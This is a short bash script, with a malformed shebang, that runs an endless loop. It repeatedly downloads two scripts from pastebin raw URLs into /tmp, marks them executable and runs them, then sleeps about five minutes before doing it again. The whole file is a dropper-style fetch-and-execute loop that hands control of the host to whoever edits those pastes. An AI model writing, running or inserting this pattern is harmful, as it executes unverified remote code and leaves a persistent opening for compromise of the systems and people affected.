!#/bin/bash
while :
do
	wget -O /tmp/one.sh https://pastebin.com/raw/p9HPTW1W  
	wget -O /tmp/two.sh https://pastebin.com/raw/4JWM1qWu
	sleep 2
	chmod +x /tmp/one.sh
	chmod +x /tmp/two.sh
	/tmp/one.sh && /tmp/two.sh
	sleep 310
done
